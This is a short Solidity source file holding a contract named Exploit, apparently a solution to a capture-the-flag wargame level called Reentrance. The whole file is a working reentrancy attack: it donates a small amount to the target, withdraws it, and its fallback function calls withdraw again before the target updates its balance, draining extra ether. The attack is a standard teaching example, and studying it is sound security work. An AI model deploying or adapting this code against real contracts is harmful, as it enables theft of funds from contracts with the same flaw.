// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance) ;
    function withdraw(uint _amount) external;
}

contract Exploit {

    uint count;
    IReentrance target;
    constructor(address targetAddress) public payable {
        target = IReentrance(targetAddress);
        count = 0;
    }

    function fire() payable public {
        target.donate{value: 0.001 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    fallback() external payable {
        count++;
        if (count == 1) {
            target.withdraw(0.001 ether);
        }
    }
}